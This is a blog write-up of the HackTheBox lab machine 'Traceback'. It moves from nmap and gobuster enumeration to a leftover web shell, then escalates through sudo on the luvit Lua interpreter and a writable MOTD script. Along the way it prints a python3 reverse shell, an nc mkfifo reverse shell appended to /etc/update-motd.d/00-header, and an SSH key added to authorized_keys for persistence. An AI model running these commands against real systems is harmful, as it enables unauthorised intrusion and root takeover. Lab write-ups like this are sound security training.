---
layout: post
title: "HackTheBox - Traceback"
author: "joona"
---
![](/images/traceback/traceback.jpg)
Traceback is a Linux box where the initial access is achieved by finding a web shell left by the website defacer.
The privilege escalation path abuses Lua programming language scripting platform and write
access to a /etc/motd-file. Good stuff.

<br/>
## Nmap results
Only SSH and HTTP ports are open.

{% highlight plaintext %}
# Nmap 7.80 scan initiated Thu Apr 16 14:02:45 2020 as: nmap -A -p- -T4 -oA nmap/traceback 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/16%OT=22%CT=1%CU=35630%PV=Y%DS=2%DC=T%G=Y%TM=5E989DF
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}


<br/>
## Website enumeration
![](/images/traceback/owned.jpg)

The website has been defaced by "Xh4H".
Inside the page source code there's a comment: <br/>
![](/images/traceback/owned2.jpg)

If we Google this phrase we get a [GitHub repository Xh4H/Web-Shells](https://github.com/Xh4H/Web-Shells) filled with different web shells.<br/>
I created a text file filled with all the names of the web shells and ran gobuster with it against the website.<br/>
`gobuster dir -u 10.10.10.181 -w webshells.txt`.

We get a hit for `/smevk.php`.<br/>
![](/images/traceback/smevk.jpg)

The default credentials for this are username: <b>admin</b> and password: <b>admin</b><br/>
![](/images/traceback/smevk2.jpg)

The web shell is running as user `webadmin`.

<br/>
## Privilege Escalation
Enumerating the <b>/home</b>-directory with the web shell we discover a file called `/home/webadmin/note.txt`:<br/>
{% highlight plaintext %}
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
{% endhighlight %}

<br/>
`sudo -l` tells us that we can run `/home/sysadmin/luvit` as <b>sysadmin</b>.
![](/images/traceback/sudo.jpg)

<br/>
Before taking a closer look, I setup a reverse shell to my own machine, so we don't have to use the web shell.
Setup a listener `nc -lvnp 6669`.<br/>

Run a python3 reverse shell:
{% highlight plaintext %}
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",6669));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

<br/>
[Luvit](http://luvit.io/blog/pure-luv.html) is a single binary that contains a Lua virtual machine and standard libraries. We can give it a
lua script to run and it runs it in the context of the system.

I created a very simple Lua script called `a.lua`:
{% highlight plaintext %}
os.execute("/bin/sh")
{% endhighlight %}

Upload this badboy to the /tmp-folder and run it:<br/>
`sudo -u sysadmin /home/sysadmin/luvit /tmp/a.lua`

![](/images/traceback/sysadmin.jpg)

Let's spawn a TTY shell to interact further with the system with:<br/>
{% highlight plaintext %}
python3 -c 'import pty; pty.spawn("/bin/sh")'
// Background the shell with Ctrl + Z
stty raw -echo
fg
{% endhighlight %}

We can now get the user flag from `/home/sysadmin`.

<br/>
## Root Access
Running `linpeas.sh` enumeration tool, it discovers a 99% sure privilege escalation vector from `/etc/update-motd.d/`.<br/>
We are able to modify the message of the day which is executed every time a user logs in.

![](/images/traceback/linpeas.jpg)

For this we can add our SSH key to the sysadmins `/home/sysadmin/.ssh/authorized_keys`-file so we can log in via SSH. Generate a key:<br/>
`ssh-keygen -t rsa`<br/>

Copy the id_rsa.pub and echo it to the authorized_keys:<br/>
`echo "long ass key" >> /home/sysadmin/.ssh/authorized_keys`

We can now add a reverse shell to the `/etc/update-motd.d/00-header`-file:<br/>
{% highlight plaintext %}
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 1335 >/tmp/f" >> /etc/update-motd.d/00-header
{% endhighlight %}

Setup a listener: `nc -lvnp 1335`.<br/>

SSH login to trigger the MOTD:<br/>
`ssh -i id_rsa sysadmin@10.10.10.181`<br/>

We get a root shell:<br/>
![](/images/traceback/rooted.jpg)

<br/>
If you have trouble getting a shell back, there's a script that resets
the motd-files every 30 second, so you have to be quick.
You can see the running processes e.g. with [pspy](https://github.com/DominicBreuker/pspy).


<br/>
Thank you for reading!
